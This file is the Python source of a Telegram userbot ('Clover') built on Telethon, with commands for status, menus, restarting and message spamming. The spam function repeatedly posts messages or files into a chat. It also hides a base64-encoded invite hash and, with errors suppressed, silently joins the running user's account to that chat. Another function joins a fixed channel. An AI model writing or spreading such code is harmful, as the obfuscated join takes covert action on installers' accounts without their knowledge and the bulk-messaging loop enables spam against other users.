from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from collections import deque
from telethon import events
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl import functions
import time
import asyncio
import logging
import base64
import datetime
from payment import *
from help import *
from config import *
from checktele import *

# -

fifthon.start()

y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy}"
sec = time.time()

LOGS = logging.getLogger(__name__)

DEVS = [
    5422543182,
]
DEL_TIME_OUT = 10
normzltext = "1234567890"
namerzfont = normzltext
name = "Profile Photos"
time_name = ["off"]
time_bio = ["off"]


async def join_channel():
    try:
        await fifthon(JoinChannelRequest("@astashope"))
    except BaseException:
        pass


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
async def _(event):
    await event.edit(commands)

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("wait...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
**★ 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙞𝙣 𝙎𝙤𝙪𝙧𝙘𝙚 𝘾𝙡𝙤𝙫𝙚𝙧 ★

•𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : 1.0
•𝙔𝙤𝙧 𝙞𝙙 : {event.sender_id} 
•𝙙𝙖𝙩𝙚 : {m9zpi} 

★𝘾𝙝𝙖𝙣𝙣𝙚𝙡 @CloverSource 𝘿𝙚𝙫 @ddssss**
''')


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م1"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec1)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م2"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec2)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م3"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec3)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.المطور"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec4)

    
ownerhson_id = 5422543182
@fifthon.on(events.NewMessage(outgoing=False, pattern='/clover'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('★ 𝙃𝙞 𝙃𝙞 𝘾𝙖𝙥𝙩𝙞𝙣 ★ @CloverSOURCE')


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.restart"))
async def update(event):
    await event.edit("**• Restarting Please Wait...** ")
    await fifthon.disconnect()
    await fifthon.send_message("me", "`Restarting 100% 🔰 `")


print("- clover Userbot Running ..")
fifthon.run_until_disconnected()
